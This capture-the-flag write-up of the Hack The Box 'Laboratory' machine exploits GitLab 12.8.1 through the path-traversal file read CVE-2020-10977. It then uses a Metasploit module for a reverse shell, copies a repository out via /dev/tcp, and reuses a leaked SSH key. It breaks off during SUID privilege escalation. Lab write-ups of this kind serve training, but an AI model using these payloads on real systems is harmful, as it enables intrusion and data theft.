<p><div class="img-container"><img src="imgs/27df62df2abf49f8bea57f0e8bae36db.png" alt="fe1e6f15f33117cf19d265d7bf02e1f0.png"  /></div>
</p>
<p>I tried to register an account, but GitLab rejected it by saying the email domain was not authorized.</p>
<p><div class="img-container"><img src="imgs/db1d849ef24942aaa0f08c2d16fc6b9b.png" alt="9c894520b4a87fd3f31e567387c472be.png"  /></div>
</p>
<p>I changed my email to <code>iamf@laboratory.htb</code> and it works.</p>
<p>The first thing I do is to check the GitLab version. It is available on the “Help” section and the current version is 12.8.1.</p>
<p><div class="img-container"><img src="imgs/108726d7e7ed445cb6a38d1e080676f9.png" alt="82ce9dcf1da9d53967aa746413c3efed.png"  /></div>
</p>
<p>I found another user on this website named <code>Dexter McPherson</code>. This user has a project called <code>SecureWebsite</code></p>
<p><div class="img-container"><img src="imgs/415abe033a4f4252ba3ac745473a9deb.png" alt="9d2a20bf9637ad08d2615a4f44514ca1.png"  /></div>
</p>
<h4 id="searchsploit">Searchsploit</h4>
<p><code>searchsploit</code> shows several exploits for GitLab. One that stands out is an arbitrary file read vulnerability on version 12.9.0 which might work as well on version 12.8.1.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «laboratory» «10.10.14.39»
$ searchsploit gitlab
------------------------------------------------------------------------- -----------------------------
Exploit Title                                                           |  Path
------------------------------------------------------------------------- -----------------------------
GitLab - <span style="color:#e6db74">&#39;impersonate&#39;</span> Feature Privilege Escalation                      | ruby/webapps/40236.txt
GitLab 11.4.7 - RCE <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                  | ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                | ruby/webapps/49257.py
GitLab 12.9.0 - Arbitrary File Read                                      | ruby/webapps/48431.txt
Gitlab 12.9.0 - Arbitrary File Read <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span>                      | ruby/webapps/49076.py
Gitlab 6.0 - Persistent Cross-Site Scripting                             | php/webapps/30329.sh
Gitlab-shell - Code Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                               | linux/remote/34362.rb
Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting        | java/webapps/47927.txt
NPMJS gitlabhook 0.0.17 - <span style="color:#e6db74">&#39;repository&#39;</span> Remote Command Execution          | json/webapps/47420.txt
------------------------------------------------------------------------- ------------------------------
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-git">Shell as git</h3>
<h4 id="gitlab-cve-2020-10977---manual">GitLab CVE-2020-10977 - Manual</h4>
<blockquote>
<p>CVE-2020-10977:
GitLab EE/CE 8.5 to 12.9 is vulnerable to a path traversal when moving an issue between projects.</p>
</blockquote>
<p>The arbitrary file read vulnerability is classified as CVE-2020–10977. The report can be found at <a href="https://hackerone.com/reports/827052">Hackerone</a>. The researcher also shows how that vulnerability can be turned into a remote code execution.</p>
<p>I&rsquo;ll reproduce the vulnerability by creating two projects. I&rsquo;ll name it as &ldquo;project1&rdquo; and &ldquo;project2&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210422215749261.png" alt="image-20210422215749261"  /></div>
</p>
<p>After that I&rsquo;ll create an issue on &ldquo;project2&rdquo; and fill the issue description with a payload as follows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-markdown" data-lang="markdown">![<span style="color:#f92672">a</span>](<span style="color:#a6e22e">/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd</span>)
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210422220227988.png" alt="image-20210422220227988"  /></div>
</p>
<p>I&rsquo;ll then move the issue on &ldquo;project2&rdquo; to &ldquo;project1&rdquo;</p>
<p><div class="img-container"><img src="imgs/image-20210422220401958.png" alt="image-20210422220401958"  /></div>
</p>
<p>The payload will then turn into an attached file.</p>
<p><div class="img-container"><img src="imgs/image-20210422220539185.png" alt="image-20210422220539185"  /></div>
</p>
<p>The attached file contains the content of <code>/etc/passwd</code> file from the system.</p>
<p><div class="img-container"><img src="imgs/image-20210422220624344.png" alt="image-20210422220624344"  /></div>
</p>
<h4 id="gitlab-cve-2020-10977---automated">GitLab CVE-2020-10977 - Automated</h4>
<p>There is also an <a href="https://github.com/thewhiteh4t/cve-2020-10977">automated version</a> to exploit this vulnerability written in Python.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «laboratory» «10.10.14.39»
$ python3 cve_2020_10977.py https://git.laboratory.htb/ iamf iamfiamf

...&lt;SNIP&gt;...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Target        : https://git.laboratory.htb
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Username      : iamf
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Password      : iamfiamf
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Project Names : ProjectOne, ProjectTwo

<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying to Login...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Login Successful!
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Creating ProjectOne...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> ProjectOne Created Successfully!
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Creating ProjectTwo...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> ProjectTwo Created Successfully!
<span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> Absolute Path to File : /etc/passwd
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Creating an Issue...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Issue Created Successfully!
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Moving Issue...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Issue Moved Successfully!
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> File URL : https://git.laboratory.htb/iamf/ProjectTwo/uploads/9335567cda468be5d53e6ddcca1412e4/passwd

&gt; /etc/passwd
----------------------------------------

...&lt;SNIP&gt;...
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
...&lt;SNIP&gt;...
</code></pre></div><h4 id="lfi-to-rce">LFI to RCE</h4>
<p>To turns this arbitrary file read vulnerability into a remote code execution, I’ll need to setup my own GitLab instance with the same version as the one on Laboratory. Then I’ll have to replace my GitLab <code>secret_key_base</code> with the one on Laboratory (located on <code>/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code>).  After that all is set, I&rsquo;ve to craft my own cookie to get the code execution on the system.</p>
<p>Fortunately, there is a Metasploit <a href="https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/">module</a> to perform this automatically, and I’ll use that.</p>
<p>First, I’ll have to grab the module from GitHub and put it into <code>/usr/share/metasploit-framework/modules/exploits/multi/http</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «laboratory» «10.10.14.39»
$ cd /usr/share/metasploit-framework/modules/exploits/multi/http <span style="color:#f92672">&amp;&amp;</span> wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/multi/http/gitlab_file_read_rce.rb
</code></pre></div><p>After that I’ll re-initialize the metasploit database using <code>msfdb</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
$ msfdb reinit
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting database
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dropping databases <span style="color:#e6db74">&#39;msf&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dropping databases <span style="color:#e6db74">&#39;msf_test&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dropping database user <span style="color:#e6db74">&#39;msf&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleting configuration file /usr/share/metasploit-framework/config/database.yml
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Stopping database
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting database
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Creating database user <span style="color:#e6db74">&#39;msf&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Creating databases <span style="color:#e6db74">&#39;msf&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Creating databases <span style="color:#e6db74">&#39;msf_test&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Creating configuration file <span style="color:#e6db74">&#39;/usr/share/metasploit-framework/config/database.yml&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Creating initial database schema
</code></pre></div><p>Now on Metasploit, I can use the module by issuing the command below:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 &gt; use exploit/multi/http/gitlab_file_read_rce
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to generic/shell_reverse_tcp
</code></pre></div><p>Below are the options needed by the module.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set USERNAME iamf
USERNAME <span style="color:#f92672">=</span>&gt; iamf
msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set PASSWORD iamfiamf
PASSWORD <span style="color:#f92672">=</span>&gt; iamfiamf
msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set RHOSTS 10.10.10.216
RHOSTS <span style="color:#f92672">=</span>&gt; 10.10.10.216
msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set RPORT <span style="color:#ae81ff">443</span>
RPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">443</span>
msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set SSL true
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Changing the SSL option’s value may require changing RPORT!
SSL <span style="color:#f92672">=</span>&gt; true
msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set VHOST git.laboratory.htb
VHOST <span style="color:#f92672">=</span>&gt; git.laboratory.htb
msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set LHOST tun0
LHOST <span style="color:#f92672">=</span>&gt; tun0
msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">9001</span>
LPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">9001</span>
</code></pre></div><p>After all the required options are set, I’ll start the exploit with the <code>run</code> command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; run
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.39:9001 
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing automatic check <span style="color:#f92672">(</span>disable AutoCheck to override<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Logged in to user iamf
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Created project /iamf/hpt2TORA
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Created project /iamf/ysGE0u0L
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Created issue /iamf/hpt2TORA/issues/1
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing arbitrary file load
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> File saved as: <span style="color:#e6db74">&#39;/root/.msf4/loot/20210321174611_default_10.10.10.216_gitlab.secrets_490542.txt&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file read
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attempting to delete project /iamf/hpt2TORA
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Deleted project /iamf/hpt2TORA
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attempting to delete project /iamf/ysGE0u0L
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Deleted project /iamf/ysGE0u0L
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.14.39:9001 -&gt; 10.10.10.216:52726<span style="color:#f92672">)</span> at 2021-03-21 17:46:14 -0400

id;hostname
uid<span style="color:#f92672">=</span>998<span style="color:#f92672">(</span>git<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>998<span style="color:#f92672">(</span>git<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>998<span style="color:#f92672">(</span>git<span style="color:#f92672">)</span>
git.laboratory.htb
</code></pre></div><p>I have shell as user <code>git</code>.</p>
<p>There is a <code>.dockerenv</code> file in the root directory. This indicates that I&rsquo;m inside a docker container.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ls -la /
total <span style="color:#ae81ff">88</span>
drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2020</span> .
drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2020</span> ..
-rwxr-xr-x   <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">0</span> Jul  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2020</span> .dockerenv
-rw-r--r--   <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">157</span> Feb <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> RELEASE
drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> assets
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-dexter">Shell as dexter</h3>
<h4 id="container-enumeration">Container enumeration</h4>
<p>Enumerating the <code>git</code> home directory (<code>/var/opt/gitlab</code>) discovers two repositories that belongs to user <code>dexter</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@git:~$ grep -Ri dexter 2&gt;/dev/null

git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git/config:        fullpath <span style="color:#f92672">=</span> dexter/securedocker
git-data/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.git/config:        fullpath <span style="color:#f92672">=</span> dexter/securewebsite
</code></pre></div><p>I haven&rsquo;t seen that <code>dexter/securedocker</code> before in the GitLab application. So I&rsquo;ll grab that repository and transfer it to my machine</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@git:~/git-data/repositories/@hashed/19/58$ ls -la 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
total <span style="color:#ae81ff">40</span>
drwxr-s---  <span style="color:#ae81ff">6</span> git root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> .
drwxr-s---  <span style="color:#ae81ff">4</span> git root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> ..
-rw-r--r--  <span style="color:#ae81ff">1</span> git root   <span style="color:#ae81ff">23</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> HEAD
-rw-r--r--  <span style="color:#ae81ff">1</span> git root  <span style="color:#ae81ff">107</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> config
-rw-r--r--  <span style="color:#ae81ff">1</span> git root   <span style="color:#ae81ff">73</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> description
drwxr-sr-x  <span style="color:#ae81ff">2</span> git root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> hooks
drwxr-sr-x  <span style="color:#ae81ff">2</span> git root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> info
-rw-r--r--  <span style="color:#ae81ff">1</span> git root  <span style="color:#ae81ff">112</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> language-stats.cache
drwxr-sr-x <span style="color:#ae81ff">14</span> git root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> objects
drwxr-sr-x  <span style="color:#ae81ff">4</span> git root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> refs
</code></pre></div><p>First, I’ll create a tarball archive of that repository and I’ll name it as <code>exfil-securedocker-git.tar</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@git:~/git-data/repositories/@hashed/19/58/$ tar -czf /tmp/exfil-securedocker-git.tar 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
</code></pre></div><p>On my machine, I&rsquo;ll setup a listener</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.39»
$ nc -nvlp <span style="color:#ae81ff">9000</span> &gt; exfil-securedocker-git.tar
</code></pre></div><p>Back on Laboratory, I’ll send the repository  tarball to my machine using <code>cat</code> and <code>bash</code> trick</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@git:~/git-data/repositories/@hashed/19/58/$ cat /tmp/exfil-securedocker-git.tar &gt; /dev/tcp/10.10.14.39/9000
</code></pre></div><p>My listener received the tarball.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.39»
$ nc -nvlp <span style="color:#ae81ff">9000</span> &gt; exfil-securedocker-git.tar
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9000</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.39<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.216<span style="color:#f92672">]</span> <span style="color:#ae81ff">42426</span>
</code></pre></div><h4 id="recover-securedocker-repository">Recover &lsquo;securedocker&rsquo; repository</h4>
<p>After extracting the repository, I saw <code>git:(master)</code> pop up in my zsh prompt which indicates this is a git repository.</p>
<p>But, when I try to read the repository status, it returns an error message.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.39»
$ tar -xzf exfil-securedocker-git.tar

→ root@iamf «loot» «10.10.14.39»
$ cd 19581e27de7ced....5ef03f7c3017bb5b7.git

→ root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span>
$ git status
fatal: this operation must be run in a work tree
</code></pre></div><blockquote>
<p>I&rsquo;ve renamed <code>19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git</code> to <code>secure-docker.git</code>.</p>
</blockquote>
<p>This problem can be resolved by creating a new <code>.git</code> folder within <code>secure-docker.git</code> and transferring all the files from <code>secure-docker.git</code> to the newly created <code>.git</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span>
$ mkdir .git
→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span>
$ mv * .git
→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span>
$ git status
fatal: this operation must be run in a work tree
</code></pre></div><p>Finally, use the <code>git init</code> command to re-initialize the git repository.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span>
$ git init
Reinitialized existing Git repository in /root/htb/to-do/laboratory/loot/secure-docer.git/.git/

→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
$ git status
On branch master
Changes to be committed:
  <span style="color:#f92672">(</span>use <span style="color:#e6db74">&#34;git restore --staged &lt;file&gt;...&#34;</span> to unstage<span style="color:#f92672">)</span>
        deleted:    README.md
        deleted:    create_gitlab.sh
        deleted:    dexter/.ssh/authorized_keys
        deleted:    dexter/.ssh/id_rsa
        deleted:    dexter/recipe.url
        deleted:    dexter/todo.txt
</code></pre></div><p>Interestingly, this repository contains a set of SSH keys.</p>
<h4 id="ssh---dexter">SSH - dexter</h4>
<p>I can restore the deleted files with <code>git checkout --</code> command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
$ git checkout --
→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
$ ls -la
total <span style="color:#ae81ff">20</span>
drwxr-xr-x <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">22</span> 09:36 .
drwxr-xr-x <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">22</span> 09:36 ..
-rw-r--r-- <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">102</span> Mar <span style="color:#ae81ff">22</span> 09:36 recipe.url
drwxr-xr-x <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">22</span> 09:36 .ssh
-rw-r--r-- <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">160</span> Mar <span style="color:#ae81ff">22</span> 09:36 todo.txt
</code></pre></div><p>I can now login as <code>dexter</code> using the SSH key I obtained.</p>
<p>At first try, it says the key is invalid format.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
$ chmod <span style="color:#ae81ff">600</span> dexter/.ssh/id_rsa
→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
$ ssh -i dexter/.ssh/id_rsa dexter@10.10.10.216
Load key <span style="color:#e6db74">&#34;id_rsa&#34;</span>: invalid format
dexter@10.10.10.216: Permission denied <span style="color:#f92672">(</span>publickey<span style="color:#f92672">)</span>.
</code></pre></div><p>I fixed that by adding an empty string using the <code>echo</code> command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
$ echo <span style="color:#e6db74">&#39;&#39;</span> &gt;&gt; dexter/.ssh/id_rsa
</code></pre></div><p>Now it logs me in.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
$ ssh -i id_rsa dexter@10.10.10.216
dexter@laboratory:~$
dexter@laboratory:~$ id;hostname
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dexter<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dexter<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dexter<span style="color:#f92672">)</span>
laboratory
dexter@laboratory:~$ ls -l
total <span style="color:#ae81ff">4</span>
-r--r----- <span style="color:#ae81ff">1</span> root dexter <span style="color:#ae81ff">33</span> Mar <span style="color:#ae81ff">22</span> 10:06 user.txt
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>The contents of <code>todo.txt</code> talks something about “docker security”, but I have no idea what it is except it uses three hashtags.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
$ cat dexter/todo.txt
<span style="color:#75715e"># DONE: Secure docker for regular users</span>
<span style="color:#75715e">### DONE: Automate docker security on startup</span>
<span style="color:#75715e"># TODO: Look into &#34;docker compose&#34;</span>
<span style="color:#75715e"># TODO: Permanently ban DeeDee from lab#</span>
</code></pre></div><p>It turns out it’s a binary name which has a SUID bit set found by Linpeas.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">...&lt;SNIP&gt;...
════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SUID - Check easy privesc, exploits and write perms                                                                                
-rwsr-xr-x <span style="color:#ae81ff">1</span> root   dexter           17K Aug <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2020</span> /usr/local/bin/docker-security
</code></pre></div><p>Inspecting the binary with the <code>ltrace</code> command finds out that it uses relative path to call <code>chmod</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dexter@laboratory:~$ ltrace docker-security 

setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>                                                                                                <span style="color:#f92672">=</span> -1
setgid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>                                                                                                <span style="color:#f92672">=</span> -1
system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;chmod 700 /usr/bin/docker&#34;</span>chmod: changing permissions of <span style="color:#e6db74">&#39;/usr/bin/docker&#39;</span>: Operation not permitted
